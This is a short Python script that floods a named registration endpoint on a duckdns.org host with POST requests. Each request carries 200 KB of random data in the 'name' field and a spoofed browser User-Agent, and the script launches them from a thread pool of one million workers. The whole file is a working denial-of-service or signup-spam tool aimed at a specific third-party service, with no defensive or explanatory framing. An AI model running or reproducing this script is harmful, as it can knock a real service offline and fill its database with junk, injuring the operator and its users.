import requests
import string
import random
import concurrent.futures

def generate_random_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def send_post_request():
    url = "http://proxysystem.duckdns.org/kay%C4%B1tol"
    data = {
        'member': '1',
        'name': generate_random_data(200 * 1024), 
        'key': '12345678',
        'gun': '30',
        'multi': '0'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    response = requests.post(url, data=data, headers=headers)
    print(f'Status Code: {response.status_code}')

def main():
    num_threads = 1000000  
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_post_request) for _ in range(num_threads)]
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    main()
